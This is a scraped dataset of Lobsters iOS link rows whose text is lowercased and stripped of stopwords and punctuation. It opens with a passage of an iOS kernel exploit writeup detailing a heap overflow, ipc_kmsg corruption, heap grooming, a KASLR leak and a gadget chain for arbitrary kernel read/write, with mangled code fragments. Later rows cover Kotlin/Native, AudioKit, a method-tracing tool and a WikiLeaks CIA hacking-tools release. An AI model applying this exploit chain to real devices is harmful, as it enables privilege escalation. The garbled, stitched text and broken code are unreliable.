conjecture think quite plausible recipe copypasta right machvoucherextractattrrecipetrap method machkernelrpcc code hostcreatemachvouchertrap another mach trap two function look similar branch small large input size keep small recipe stack speed comment small path make kernel heap allocation large path pretty clear code machvoucherextractattrrecipetrap copypasted hostcreatemachvouchertrap updated reflect subtle difference prototype difference size argument hostcreatemachvouchertrap integer size argument machvoucherextractattrrecipetrap pointer integer mean machvoucherextractattrrecipetrap requires extra level indirection first need copyin size use even confusingly size argument original function called recipessize newer function called recipesize one fewer relevant code two function first snippet fine second bug hostcreatemachvouchertrap copyin args recipe void krecipes args recipessize kfree krecipes vmsizet args recipessize kr kernmemoryerror goto done machvoucherextractattrrecipetrap copyin args recipe void krecipe args recipesize kfree krecipe vmsizet sz kr kernmemoryerror goto done guess developer copypasted code entire function tried add extra level indirection forgot change third argument copyin call shown built xnu looked compiler error message xnu build clang give fancy error message like error member named recipessize struct machvoucherextractattrrecipeargs mean recipesize copyin args recipe void krecipes args recipessize recipesize clang assumes developer made typo typed extra clang realize suggestion semantically totally wrong introduce critical memory corruption issue think developer took clang suggestion removed rebuilt code compiled without error building primitive copyin io fail size argument greater since recipessize also need valid userspace pointer mean able map address low io app giving pagezerosize linker option small value completely control size copy ensuring data aligned right end page unmapping page copyin fault copy reach unmapped source page stop copyin fails kalloced buffer immediately freed putting bit together make kalloc heap allocation byte overflow much want completely controlled data working new exploit spend lot time looking new primitive example object allocated heap could overflow could cause chain interesting thing happen generally interesting mean corrupt use build better primitive usually end goal chain primitive get arbitrary repeatable reliable memory readwrite end one style object always lookout something contains length size field corrupted without fully corrupt pointer usually interesting target warrant investigation anyone ever written browser exploit familiar construct ipckmsg reading xnu code interesting looking primitive came across struct ipckmsg struct ipckmsg machmsgsizet ikmsize struct ipckmsg ikmnext struct ipckmsg ikmprev machmsgheadert ikmheader ipcportt ikmprealloc ipcportt ikmvoucher machmsgpriorityt ikmqos machmsgpriorityt ikmqosoverride struct ipcimportanceelem ikmimportance queuechaint ikminheritance structure size field corrupted without needing know pointer value ikmsize field used looking cross reference ikmsize code see used handful place void ipckmsgfree ipckmsgt kmsg function us kmsg ikmsize free kmsg back correct kalloc zone zone allocator detect free wrong zone panic careful free corrupted ipckmsg without first fixing size macro used set ikmsize field define ikminit kmsg size macrobegin kmsg ikmsize size macro us ikmsize field set ikmheader pointer define ikmsetheader kmsg mtsize macrobegin kmsg ikmheader machmsgheadert vmoffsett kmsg kmsg ikmsize mtsize macroend macro using ikmsize field set ikmheader field message aligned end buffer could interesting finally check ipckmsggetfromkernel msgandtrailersize kmsg ikmsize maxdesc ipunlock destport return machsendtoolarge using ikmsize field ensure enough space ikmkmsg buffer message look like corrupt ikmsize field able make kernel believe message buffer bigger really almost certainly lead message content written bound turned kernel heap overflow another kernel heap overflow difference time corrupted ipckmsg might also let read memory bound corrupting ikmsize field could interesting thing investigate sending message ikmkmsg structure used hold intransit mach message userspace sends mach message end ipckmsgalloc message small le ikmsavedmsgsize code first look cpulocal cache recently freed ikmkmsg structure none found allocate new cacheable message dedicated ipckmsg zalloc zone larger message bypass cache directly allocated kalloc general purpose kernel heap allocator allocating buffer structure immediately initialized using two macro saw kmsg ipckmsgt kalloc ikmplusoverhead maxexpandedsize kmsg ikmnull ikminit kmsg maxexpandedsize ikmsetheader kmsg msgandtrailersize return kmsg unless able corrupt ikmsize field two macro able cause message freed wrong zone immediately panic useful ikmsetheader called one place ipckmsggetfromkernel function used kernel sends real mach message used sending reply kernel mig apis example function comment explains routine ipckmsggetfromkernel purpose first check preallocated message reserved kernel client found allocates new kernel message buffer copy kernel message message buffer using machportallocatefull method userspace allocate new mach port single preallocated ikmkmsg buffer controlled size intended usecase allow userspace receive critical message without kernel make heap allocation time kernel sends real mach message first check whether port one preallocated buffer currently inuse reach following code removed locking code brevity ipvalid destport ipprealloc destport machmsgsizet maxdesc kmsg destport ippremsg ikmpreallocinuse kmsg ipunlock destport return machsendnobuffer msgandtrailersize kmsg ikmsize maxdesc ipunlock destport return machsendtoolarge ikmpreallocsetinuse kmsg destport ikmsetheader kmsg msgandtrailersize ipunlock destport void memcpy void kmsg ikmheader const void msg size code check whether message would fit trusting kmsg ikmsize mark preallocated buffer inuse call ikmsetheader macro set ikmheader message align end buffer finally call memcpy copy message ipckmsg mean corrupt ikmsize field preallocated ipckmsg make appear larger kernel sends message write message content end preallocate message buffer ikmheader also used mach message receive path dequeue message also read bound could replace whatever originally message buffer data want read could read back part content message new primitive building powerful another way get right able read write bound repeatable controlled way without trigger bug time exceptional behaviour one difficulty preallocated message used kernel send message u send message controlled data get use preallocated ipckmsg instead need persuade kernel send u message data control much harder handful place kernel actually sends userspace mach message various type notification message like iodataqueue dataavailable notification ioserviceusernotifications nosenders notification usually contains small amount usercontrolled data message type sent kernel seem contain decent amount usercontrolled data exception message thread fault example accessing unallocated memory calling software breakpoint instruction kernel send exception message thread registered exception handler port thread exception handler port kernel try send message task exception handler port also fails exception message delivered global host exception port thread normally set exception port setting host exception port privileged action routine threadsetexceptionports thread threadactt exceptionmask exceptionmaskt newport machportt behavior exceptionbehaviort newflavor threadstateflavort mig definition threadsetexceptionports newport send right new exception port exceptionmask let u restrict type exception want handle behaviour defines type exception message want receive newflavor let u specify kind process state want included message passing exceptionmask excmaskall exceptionstate behavior newflavor mean kernel send exceptionraisestate message exception port specify whenever specified thread fault message contain state general purpose register use get controlled data written end ipckmsg buffer assembly required io xcode project added new assembly file define function loadregsandcrash text globl loadregsandcrash align loadregsandcrash mov ldp ldp ldp ldp ldp ldp ldp ldp ldp ldp ldp ldp ldp ldp ldp brk align function take pointer byte buffer first argument assigns first generalpurposes register value buffer trigger software interrupt via brk kernel sends exception message message contains byte input buffer order got way get controlled data message sent preallocated port value overwrite ikmsize get controlled portion message overlap start following heap object possible determine statically would much easier could use kernel debugger take look happens however io run lockeddown hardware supported way kernel debugging going build kernel debugger printfs hexdumps proper debugger two main feature breakpoints memory peekpoke implementing breakpoints lot work still build meaningful kernel debugging environment using kernel memory access bootstrapping problem need kernel exploit give u kernel memory access order develop kernel exploit give u kernel memory access december published machportal io kernel exploit give kernel memory readwrite part wrote handful kernel introspection function allowed find process task structure lookup mach port object name build one level dump kobject pointer mach port first version new exploit developed inside machportal xcode project could reuse code everything working ported io io inside machportal able find address preallocated port buffer like allocate ipckmsg kernreturnt err machportqost qos qosprealloc qoslen size machportnamet name machportnull err machportallocatefull machtaskself machportrightreceive machportnull qos name port getport name preallocbuf printf n preallocbuf getport part machportal exploit defined like getport machportnamet portname return procportnametoportptr ourproc portname procportnametoportptr proc machportnamet portname port getprocipctable proc portindex portname port port portindex ieobject return port getprocipctable proc taskt proc structproctaskoffset itkspace taskt structtaskitkspaceoffset istable itkspace structipcspaceistableoffset return istable code snippet using function provided machportal exploit read kernel memory via kernel task port used method trial error determine correct value overwrite ikmsize able align controlled portion exception message start next heap object getwherewhat final piece puzzle ability know controlled data rather writewhatwhere want get one way achieve context local privilege escalation exploit place kind data userspace hardware mitigation like smap amcc hardware iphone make harder therefore construct new primitive find ipckmsg buffer kernel memory whilst experimenting heap behaviour using introspection technique described noticed size class would actually still give close linear allocation behavior later allocation contiguous turn due lowerlevel allocator zalloc get page exhausting particular zone force zalloc fetch new page allocation size close page size get page back immediately mean use code like int preallocsize int preallocport preallocsize contiguous convenient machportt holder preallocport preallocsize machportt firstport preallocport preallocsize machportt secondport preallocport preallocsize get heap layout like completely reliable device ram need increase iteration count zone exhaustion loop perfect technique work perfectly well enough research tool free holder port trigger overflow reuse slot holder overflow firstport grab slot another holder port free holder machportdestroy machtaskself holder reallocate holder overflow overflowbytes dooverflow overflowbytes grab holder holder preallocport preallocsize overflow changed ikmsize field preallocated ipckmsg belonging first port ipckmsg structure filled ipcgetkmsgfromkernel enqueued target port queue pending message ipckmsgenqueue void ipckmsgenqueue ipckmsgqueuet queue ipckmsgt kmsg ipckmsgt first queue ikmqbase ipckmsgt last first ikmnull queue ikmqbase kmsg kmsg ikmnext kmsg kmsg ikmprev kmsg else last first ikmprev kmsg ikmnext first kmsg ikmprev last first ikmprev kmsg last ikmnext kmsg port pending message ikmnext ikmprev field ipckmsg form doublylinked list pending message port pending message ikmnext ikmprev set point back kmsg following interleaving message sends receives allow u use fact read back address second ipckmsg buffer validheader sendpreallocmsg firstport validheader send message second port writing pointer prealloc buffer sendpreallocmsg secondport validheader receive first port reading header second buf receivepreallocmsg firstport address second port kernelbufferbase buf implementation sendpreallocmsg void sendpreallocmsg machportt port buf int n struct threadargs args malloc sizeof struct threadargs memset args sizeof struct threadargs memcpy args buf buf n args exceptionport port start new thread passing buffer exception port pthreadt pthreadcreate null dothread void args associate pthreadt port join correct pthread receive exception message exit kernreturnt err machportsetcontext machtaskself port machportcontextt wait message actually sent porthasmessage port remember get controlled data port preallocated ipckmsg need kernel send exception message sendpreallocmsg actually cause exception allocates struct threadargs contains copy controlled data want message target port start new thread call dothread void dothread void arg struct threadargs args struct threadargs arg buf memcpy buf args buf sizeof buf kernreturnt err err threadsetexceptionports machthreadself excmaskall args exceptionport exceptionstate free args loadregsandcrash buf return null dothread copy controlled data threadargs structure local buffer set target port thread exception handler free argument structure call loadregsandcrash assembler stub copy buffer first general purpose register trigger software breakpoint point kernel interrupt handler call exceptiondeliver look thread exception port call mig machexceptionraisestate method serialize crashing thread register state mig message call machmsgrpcfromkernelbody grab exception port preallocated ipckmsg trust ikmsize field use align sent message belief end buffer order actually read data back need receive exception message case got kernel send message first port effect writing valid header second port use memory corruption primitive overwrite next message header data already contains note send message immediately receive read back wrote order read back something interesting change sending message second port sent message first port received observed port message queue empty message enqueued ikmnext field point back message sending message secondport overwriting header one make ipckmsg still valid unused reading back message sent first port determine address second port ipckmsg buffer readwrite arbitrary readwrite turned single heap overflow ability reliably overwrite read back content byte region firstport ipckmsg object often want also know region kernel virtual address space final step turn ability read write arbitrary kernel memory machportal exploit went straight kernel task port object time chose go different path build neat trick saw pegasus exploit detailed lookout writeup whoever developed exploit found iokit serializer serialize method neat gadget let turn ability call function one argument point controlled data ability call another controlled function two completely controlled argument order use need able call controlled address passing pointer controlled data also need know address osserializer serialize let free secondport reallocate iokit userclient send another message first writing valid safe header back second sendpreallocmsg firstport validheader free second get reallocated userclient machportdeallocate machtaskself secondport machportdestroy machtaskself secondport machportt uc allocuserclient read back start userclient buffer buf receivepreallocmsg firstport save copy original object memcpy legitobject buf sizeof legitobject vtable agxcommandqueue vtable buf allocuserclient allocates user client type agxaccelerator ioservice agxcommandqueue object iokit default operator new us kalloc agxcommandqueue byte also use zone reuse memory freed secondport ipckmsg note sent another message valid header firstport overwrote secondport header valid header secondport freed memory reused user client dequeue message firstport read back first byte agxcommandqueue object first qword pointer agxcommandqueue vtable using determine kaslr slide thus work address osserializer serialize calling iokit mig method agxcommandqueue userclient likely result least three virtual call retain called iokitlookupconnectport mig intran userclient port method also call getmetaclass finally mig wrapper call iokitremoveconnectreference call release since c virtual method pas pointer first implicit argument meaning able fulfil requirement able use osserializer serialize gadget let look closely exactly work class osserializer public osobject osdeclaredefaultstructors osserializer void target void ref osserializercallback callback virtual bool serialize osserialize serializer const bool osserializer serialize osserialize const return callback target ref clearer going look disassembly osserializer serialize osserializer serialize osserializer hidden osserialize mov ldp load ldr load mov mov br call since readwrite access first byte agxcommandqueue userclient know memory replace following fake object turn virtual call release call arbitrary function pointer two controlled argument redirected vtable pointer point back object interleave vtable entry need along data need one primitive top turn arbitrary function call two controlled argument arbitrary memory readwrite function like copyin copyout obvious candidate handle complexity involved copying across userkernel boundary take three argument source destination size completely control two however since already ability read write fake object userspace actually copy value kernel buffer rather copy userspace directly mean expand search memory copying function like memcpy course memcpy memmove bcopy also take three argument need wrapper around one pass fixed size looking crossreferences function find uuidcopy uuidcopy uuidt dst const uuidt src mov size b memmove function simple wrapper around memmove always pass fixed size let integrate final primitive serializer gadget make read write swap order argument copy arbitrary address fake userclient object receive exception message read read data critical code criticised every developer make mistake natural part software development process especially compiler egging however brand new kernel code device running xnu deserves special attention opinion bug clear failure code review process place apple hope bug writeups like taken seriously lesson learnt perhaps importantly think bug would caught development code test well critical security bug code work recipe size greater macos test would immediately kernel panic find consistently surprising coding standard critical codebases enforce development even basic regression test xnu alone common story across many codebases example lg shipped android kernel new custom syscall containing trivial unbounded strcpy triggered chrome normal operation extra irony custom syscall collided syscall number sysseccomp exact feature chrome trying add support prevent issue exploitable
291,Lobsters,ios,Apple iOS,Kotlin/Native Tech Preview: Kotlin without a VM,https://blog.jetbrains.com/kotlin/2017/04/kotlinnative-tech-preview-kotlin-without-a-vm/,kotlinnative tech preview kotlin without vm,kotlinnative mission technology target platform memory management current limitation release note future plan try mac io linux raspberry pi github project release note feedback welcome public slack,happy announce first technology preview kotlinnative compiles kotlin directly machine code kotlinnative compiler produce standalone executables run without virtual machine fully functional release yet already play technology take look source code compiler available apache os license mission kotlinnative another step toward making kotlin usable throughout modern application eventually possible use kotlin write every component server backend web mobile client sharing skill set one big motivation scenario another sharing actual code vision interplatform code reuse following one write entire module kotlin platformindependent way compile supported platform currently kotlinjvm kotlinjs upcoming kotlinnative call common module part common module may require platformspecific implementation developed individually platform common module provide common api client platformspecific module extend api provide exclusive capability platform note intend make arbitrary kotlinjvm program runnable kotlinnative kotlinjs would equivalent implementing another jvm lot work lot limitation runtime going another way providing common language platform enabling creation common library seamless interoperability platform code technology kotlinnative us llvm compiler infrastructure generate machine code preview support following target platform mac o x later ubuntu linux later linux flavour may work well apple io crosscompiled macos x host raspberry pi crosscompiled linux host platform added relatively easily long llvm support available probably support platform outofthebox future usual interoperability among top priority kotlinnative efficiently call c function passget data tofrom generate kotlin binding c header file build time get fast typesafe access api native target platform see detailed instruction memory management kotlinnative designed potentially enable different memory management solution different target platform example future may make sense tracing gc serverdesktop platform arc make lot sense io platform may need manual memory management get even smaller kotlinnative runtime return technology preview feature automatic reference counting cycle collector top final memory management solution look like unknown point current limitation mentioned kotlinnative far complete technology preview number limitation eliminated later stage performance optimization done yet benchmarking kotlinnative make sense point standard library reflection support far complete apis added later read release note future plan currently working core technology kotlinnative target platform compiler core runtime library matter possible future work considering following possible use case io application reusing code android embedded systemsiot eg arduino beyond data analysis scientific computing serverside microservices lowfootprint executables utilizing power coroutines game development try prepared two archive compiler sample documentation mac io linux raspberry pi check github project release note instruction feedback welcome kotlinnative channel public slack get invite
292,Lobsters,ios,Apple iOS,Imagination Technologies‚Äô shares collapse after Apple ditches Brit chip designer,https://arstechnica.com/business/2017/04/apple-ditches-imagination-technologies-shares-collapse/,imagination technology share collapse apple ditch brit chip designer,apple locked potential buyout talk imagination technology said axed job last year said,imagination technology year apple locked potential buyout talk imagination technology iphone maker set abandon british chip design company share imagination freefall monday morning imagination confirmed would lose biggest customer apple view longer use group intellectual property new product month two year time eligible royalty payment current license royalty agreement said statement press struggling ukbased semiconductor supplier axed job last year said needed slash million pound operating cost warned slump iphone sale hurt business roughly half company revenue derives licensing deal apple apple told company working separate independent graphic design ditch imagination technology take control product ip row appears brewing imagination said apple presented evidence substantiate assertion longer require imagination technology without violating imagination patent intellectual property confidential information evidence requested imagination apple declined provide imagination belief would extremely challenging design brand new gpu architecture basic without infringing intellectual property right accordingly imagination accept apple assertion said talk potential alternative commercial arrangement current license royalty agreement taking place apple adding imagination reserved right respect apple unauthorised use imagination confidential information imagination intellectual property right share imagination currently trading london stock percent following confirmation apple decision rip contract firm apple paid nearly million million royalty british company reported total sale million million period party group contractual arrangement essential business group except contract apple imagination said recent annual report city
293,Lobsters,ios,Apple iOS,"AudioKit: Swift audio synthesis, processing, & analysis platform for iOS, macOS and tvOS",https://github.com/audiokit/AudioKit,audiokit swift audio synthesis processing analysis platform io macos tvos,audiokit sponsor audiokit sponsoring aure github sponsor key concept installation framework readme file cocoapods carthage example code build playground release page audiokit playground video ray wenderlich audiokit tutorial audiokit tutorial ray wenderlich site getting help stackoverflow audiokit hashtag google group github issue contributing code rough outline working currently develop pull request u aurelius prochazka matthew fecher stephane peter core team slack contributor google group contributor contribute,audiokit audiokit audio synthesis processing analysis platform io macos tvos document serf onepage introduction audiokit much information available audiokit website sponsor audiokit team company using audiokit please consider sponsoring aure github sponsor key concept node operation tap node interconnectable signal processing component node output usually parameter node process another signal node also input operation similar node except signal processing component exist inside single node operation used parameter operation create complex result tap use node data source redirect audio signal away source node output node allows tap moved node node freely added audio signal path started installation installation detail found framework readme file audiokit also available via cocoapods place following podfile pod audiokit need ui component select core pod like pod audiokitcore also use carthage higher install precompiled static framework project example code three hello world project one apple platform io macos tvos play oscillator display waveform example rely audiokit framework either download precompiled framework build hello world need understand line code code description var oscillator akoscillator create sound generator audiokitoutput oscillator tell audiokit output audiokitstart start audiokit oscillatorstart start oscillator oscillatorfrequency random set oscillator parameter oscillatorstop stop oscillator playground playground contain bitesize example audiokit serve tutorial many audiokit core concept capability playground cover basic tutorial synthesis physical modeling file playback midi effect filter analysis provide playground macos project ready run xcode download audiokitplaygroundszip file release page open build project go playground page learn audiokit api fun way video playground action nt need run xcode check go audiokit playground video ray wenderlich audiokit tutorial check audiokit tutorial ray wenderlich site taken fun gentle journey framework via history sound synthesis computer audio getting help three method getting support roughly listed order try first post problem stackoverflow audiokit hashtag nt problem post stackoverflow may post google group moderated list prepare rejected moderator belief question better suited stackoverflow pretty sure problem implementation audiokit open github issue contributing code audiokit always improved core team user rough outline working currently want modify audiokit check develop branch opposed master make change send u pull request u audiokit created aurelius prochazka life line need help matthew fecher manages audiokit web site stephane peter aure coadmin manages audiokit release many important people family group description core team biggest contributor audiokit slack prolevel developer chat group contact core team member invitation contributor list people submitted code audiokit google group app announcement mailing list user contributor project exists thanks people contribute
294,Lobsters,ios,Apple iOS,Trace objc method call for ios and mac,https://github.com/tboox/itrace,trace objc method call io mac,join github today sign file permalink itrace ÁâπÊÄß Êõ¥Êñ∞ÂÜÖÂÆπ xmakeÊñáÊ°£ tbox ËÅîÁ≥ªÊñπÂºè topic resource license reload reload,trace objc method call io mac dismiss join github today github home million developer working together host review code manage project build software together sign file permalink failed load latest commit information type name latest commit message commit time itrace trace objc method call io mac Â¶ÇÊûú‰Ω†ÊÉ≥ÈÄÜÂêë Êüê‰∫õappÁöÑË∞ÉÁî®ÊµÅÁ®ã ÊàñËÄÖ Á≥ªÁªüappÁöÑ‰∏Ä‰∫õÂäüËÉΩÁöÑ ÁßÅÊúâ framework class api ÂèØ‰ª•ËØïËØïÊ≠§Â∑•ÂÖ∑ Âè™ÈúÄË¶Å ÈÖçÁΩÆÈúÄË¶ÅÊåÇÊé•ÁöÑ Â∞±ÂèØ‰ª•ÂÆûÊó∂ËøΩË∏™ Áõ∏ÂÖ≥ÂäüËÉΩÁöÑ ÊîØÊåÅÊâπÈáè hook nÂ§ö‰∏™Á±ªÂêç ÁâπÊÄß ÊâπÈáèË∑üË∏™ios‰∏ãÊåáÂÆöclassÂØπË±°ÁöÑÊâÄÊúâË∞ÉÁî®ÊµÅÁ®ã ÊîØÊåÅios ‰ª•Âèämac Êõ¥Êñ∞ÂÜÖÂÆπ ÈÖçÁΩÆÈúÄË¶ÅÊåÇÊé•ÁöÑclass xml version encoding itrace class ssdevice ssdownload ssdownloadmanager ssdownloadqueue cpdistributedmessagingcenter cpdistributednotificationcenter nsstring args class itrace ÊØîÂ¶Ç uiview ÂèØ‰ª•Âú®ÂØπÂ∫îÁöÑÁ±ªÂêçÂêéÈù¢ Âä†‰∏ä args ÂÆâË£ÖÊñá‰ª∂ tmp tmpitracer tmpitracedylib tmpitracexml ËøõË°åtrace cd tmp chmod itracer ËøêË°åÁ®ãÂ∫è itracer springboard spingboard ÊîØÊåÅÁÆÄÂçïÁöÑÊ®°Á≥äÂåπÈÖç ‰ΩøÁî®substrateËøõË°åÊ≥®ÂÖ•itracedylibÊù•trace Âú®ios io ÁºñËØëÊó∂‰ΩøÁî® xmake f p iphoneos Êü•Áúã trace log ÊéßÂà∂Âè∞ËÆæÂ§álog jan unknown springboard warning itrace ssdownloadqueue downloads jan unknown springboard warning itrace ssdownloadmanager downloads jan unknown springboard warning itrace ssdownloadmanager copydownloads jan unknown springboard warning itrace ssdownloadqueue senddownloadstatuschangedatindex jan unknown springboard warning itrace ssdownloadqueue messageobserverswithfunction context jan unknown springboard warning itrace ssdownloadqueue downloads jan unknown springboard warning itrace ssdownloadmanager downloads jan unknown springboard warning itrace ssdownloadmanager copydownloads jan unknown springboard warning itrace ssdownload cachedapplicationidentifier jan unknown springboard warning itrace ssdownload status jan unknown springboard warning itrace ssdownload cachedapplicationidentifier jan unknown springboard warning itrace cpdistributednotificationcenter postnotificationname userinfo sbapplicationnotificationstatechanged sbapplicationstatedisplayidkey comappleappstore sbapplicationstatekey sbapplicationstateprocessidkey sbmostelevatedstateforprocessid jan unknown springboard warning itrace cpdistributednotificationcenter postnotificationname userinfo tobundleidentifier sbapplicationnotificationstatechanged sbapplicationstatedisplayidkey comappleappstore sbapplicationstatekey sbapplicationstateprocessidkey sbmostelevatedstateforprocessid null jan unknown springboard warning itrace ssdownloadmanager handlemessage fromserverconnection jan unknown springboard warning itrace ssdownloadmanager handledownloadstateschanged jan unknown springboard warning itrace ssdownloadmanager copydownloads jan unknown springboard warning itrace ssdownload persistentidentifier jan unknown springboard warning itrace ssdownload addcachedpropertyvalues ssdownloadphasedownloading jan unknown springboard warning itrace ssdownload applyphase tostatus ssdownloadphasedownloading ssdownloadstatus jan unknown springboard warning itrace ssdownloadqueue downloadmanager downloadstatesdidchange ssdownloadmanager ssdownload Â¶Ç‰ΩïÁºñËØë xmake f p iphoneos xmake xmake f p iphoneos xmake ËÅîÁ≥ªÊñπÂºè trace objc method call io mac topic resource license perform action time signed another tab window reload refresh session signed another tab window reload refresh session
295,Lobsters,ios,Apple iOS,iOS 10 Security White Paper,https://www.apple.com/business/docs/iOS_Security_Guide.pdf,io security white paper,,character limit please include personal information comment maximum character limit submit
297,Lobsters,ios,Apple iOS,Building iOS App Extensions With React Native,https://www.promptworks.com/blog/building-ios-app-extensions-with-react-native,building io app extension react native,show react native view action extension commit example app file show custom react native view action extension commit example app,clicking action extension open default example view controller let make insteadshow react native view action extensionas mentioned previously generated action extension included default view controller actionviewcontrollerm view controller implement viewdidload implement example functionality going replace method loadview method creates rctrootview app javascript bundle see also commit example app void loadview nsurl jscodelocation jscodelocation rctbundleurlprovider sharedsettings jsbundleurlforbundleroot indexios fallbackresource nil rctrootview rootview rctrootview alloc initwithbundleurl jscodelocation modulename rnactionextension initialproperties nil launchoptions nil rootviewbackgroundcolor uicolor alloc selfview rootview note code gently lifted straight appdelegatem file react native app nil replacing launchoptions since view accept option show custom react native view action extensionif try action extension rebuilding first see whole react native app loaded clicking action since goal action extension provide single piece functionality need update app allow showing special view action extensionwe accomplish passing initial property designate app started inside action extension render different component based property see also commit example app first update loadview method actionviewcontrollerm pas dictionary isactionextension set true initialproperties argument initwithbundleurl nsdictionary initialprops nsdictionary dictionarywithobject nsnumber numberwithbool true forkey isactionextension rctrootview rootview rctrootview alloc initwithbundleurl jscodelocation modulename rnactionextension initialproperties initialprops launchoptions nil next javascript code add new screen displayed actionextensionscreen flow import react react import text view reactnative import metric theme style import style stylesactionextensionscreenstyle export default class actionextensionscreen extends reactcomponent render return view style stylescontainer text style stylestext hello action extension text view update root component application render new screen desired prop true ignite application component appcontainersappjs update component check isactionextension prop class app extends component static proptypes isactionextension reactproptypesbool static defaultprops isactionextension false render const component thispropsisactionextension actionextensionscreen rootcontainer return provider store store component provider rebuild app open action extension see new view
298,Lobsters,ios,Apple iOS,Apple Seeds Fifth Beta of iOS 10.3 to Developers [Update: Public Beta Now Available],https://www.macrumors.com/2017/03/08/apple-seeds-ios-10-3-beta-5-to-developers/,apple seed fifth beta io developer update public beta available,fourth beta io release io find airpods subscribe macrumors youtube channel carplay interface improvement,apple today seeded fifth beta upcoming io update developer one week seeding fourth beta io almost three month release io last major update io operating system registered developer download fifth io beta apple developer center overtheair proper configuration profile installed io major update introducing several new feature change io operating system biggest new consumerfacing feature find airpods designed help airpods owner locate lost earphone find airpods record last known location airpod connected io device via bluetooth play sound lost airpod apple latest update also introduces new apple file system apfs installed io device updated io apfs optimized flashssd storage includes feature like strong encryption apple plan introduce app store change io allowing developer respond customer review first time io user also able label review app store helpful helpful help surface relevant review content subscribe macrumors youtube channel videosapple also plan limit number time developer ask review allow customer leave app review without exiting app provide master switch let user turn app review request prompt also new io redesigned app openclose animation apple id profile setting better breakdown icloud storage usage warning outdated apps wo nt work future version io homekit support programmable light switch improvement sirikit bill paying bill status scheduling future ride carplay interface improvement icloud analytics option update io beta also available public beta tester
299,Lobsters,ios,Apple iOS,eMate 300 Turns 20,https://512pixels.net/2017/03/emate-300-turns-20/,emate turn,,apple weird educationonly newton clamshell turn year old today rounded reading product
300,Lobsters,ios,Apple iOS,Wikileaks reveals CIA Hacking Tools,https://wikileaks.org/ciav7p1/index.html,wikileaks reveals cia hacking tool,press release center cyber intelligence cia targeting french political party candidate lead presidential election center cyber intelligence redact analysis cia malware target iphone android smart tv organizational chart embedded device branch edb samsung smart tv infecting vehicle control system used modern car truck numerous attack remotely hack control popular smart phone iphones apple product running io ipads numerous local remote zero day similar unit target google android used run majority world smart phone including samsung htc sony cia weaponized android zero day cia malware target window osx linux router microsoft window user hammer drill infectors removable medium usbs hide data image brutal kangaroo keep malware infestation going automated implant branch aib network device branch ndb described example section cia hoarded vulnerability zero day vulnerability equity process cyberwar program serious proliferation risk u consulate frankfurt covert cia hacker base center cyber intelligence europe instruction incoming cia hacker custom secondary screening procedure fine dining cia dramatically increased proliferation risk evading forensics antivirus tradecraft donts use encryption hide cia hacker malware communication describing target exfiltrated data executing payload persisting av defeat personal security product detecting defeating psps pspdebuggerre avoidance cia malware placing window recycle bin gaping hole doom cia malware maker could avoid similar exposure example table content umbrage remote device branch umbrage group substantial library fine dining operational support branch improvise jqjimprovise hive user developer frequently asked question redaction organizational chart organizational chart wiki page time period covered vault part vault obtained part vault different source total size vault wikileaks obtain part vault nt wikileaks worried cia act staff stop series wikileaks already mined best story wo nt journalist find best story,press release today tuesday march wikileaks begin new series leak u central intelligence agency codenamed vault wikileaks largest ever publication confidential document agency first full part series year zero comprises document file isolated highsecurity network situated inside cia center cyber intelligence langley virgina follows introductory disclosure last month cia targeting french political party candidate lead presidential election recently cia lost control majority hacking arsenal including malware virus trojan weaponized zero day exploit malware remote control system associated documentation extraordinary collection amount several hundred million line code give possessor entire hacking capacity cia archive appears circulated among former u government hacker contractor unauthorized manner one provided wikileaks portion archive year zero introduces scope direction cia global covert hacking program malware arsenal dozen zero day weaponized exploit wide range u european company product include apple iphone google android microsoft window even samsung tv turned covert microphone since cia gained political budgetary preeminence u national security agency nsa cia found building infamous drone fleet different type covert globespanning force substantial fleet hacker agency hacking division freed disclose often controversial operation nsa primary bureaucratic rival order draw nsa hacking capacity end cia hacking division formally fall agency center cyber intelligence cci registered user produced thousand hacking system trojan virus weaponized malware scale cia undertaking hacker utilized code used run facebook cia created effect nsa even le accountability without publicly answering question whether massive budgetary spend duplicating capacity rival agency could justified statement wikileaks source detail policy question say urgently need debated public including whether cia hacking capability exceed mandated power problem public oversight agency source wish initiate public debate security creation use proliferation democratic control cyberweapons single cyber weapon loose spread around world second used rival state cyber mafia teenage hacker alike julian assange wikileaks editor stated extreme proliferation risk development cyber weapon comparison drawn uncontrolled proliferation weapon result inability contain combined high market value global arm trade significance year zero go well beyond choice cyberwar cyberpeace disclosure also exceptional political legal forensic perspective wikileaks carefully reviewed year zero disclosure published substantive cia documentation avoiding distribution armed cyberweapons consensus emerges technical political nature cia program weapon analyzed disarmed published wikileaks also decided redact anonymise identifying information year zero depth analysis redaction include ten thousand cia target attack machine throughout latin america europe united state aware imperfect result approach chosen remain committed publishing model note quantity published page vault part one year zero already eclipse total number page published first three year edward snowden nsa leak analysis cia malware target iphone android smart tv cia malware hacking tool built edg engineering development group software development group within cci center cyber intelligence department belonging cia ddi directorate digital innovation ddi one five major directorate cia see organizational chart cia detail edg responsible development testing operational support backdoor exploit malicious payload trojan virus kind malware used cia covert operation worldwide increasing sophistication surveillance technique drawn comparison george orwell weeping angel developed cia embedded device branch edb infests smart tv transforming covert microphone surely emblematic realization attack samsung smart tv developed cooperation united kingdom infestation weeping angel place target tv fakeoff mode owner falsely belief tv fakeoff mode tv operates bug recording conversation room sending internet covert cia server october cia also looking infecting vehicle control system used modern car truck purpose control specified would permit cia engage nearly undetectable assassination cia mobile device branch mdb developed numerous attack remotely hack control popular smart phone infected phone instructed send cia user geolocation audio text communication well covertly activate phone camera microphone despite iphone minority share global smart phone market specialized unit cia mobile development branch produce malware infest control exfiltrate data iphones apple product running io ipads cia arsenal includes numerous local remote zero day developed cia obtained gchq nsa fbi purchased cyber arm contractor baitshop disproportionate focus io may explained popularity iphone among social political diplomatic business elite similar unit target google android used run majority world smart phone including samsung htc sony billion android powered phone sold last year year zero show cia weaponized android zero day developed obtained gchq nsa cyber arm contractor technique permit cia bypass encryption whatsapp signal telegram wiebo confide cloackman hacking smart phone run collecting audio message traffic encryption applied cia malware target window osx linux router cia also run substantial effort infect control microsoft window user malware includes multiple local remote weaponized zero day air gap jumping virus hammer drill infects software distributed cddvds infectors removable medium usbs system hide data image covert disk area brutal kangaroo keep malware infestation going many infection effort pulled together cia automated implant branch aib developed several attack system automated infestation control cia malware assassin medusa attack internet infrastructure webservers developed cia network device branch ndb cia developed automated multiplatform malware attack control system covering window mac o x solaris linux edb hive related cutthroat swindle tool described example section cia hoarded vulnerability zero day wake edward snowden leak nsa u technology industry secured commitment obama administration executive would disclose ongoing basis rather hoard serious vulnerability exploit bug zero day apple google microsoft usbased manufacturer serious vulnerability disclosed manufacturer place huge swathe population critical infrastructure risk foreign 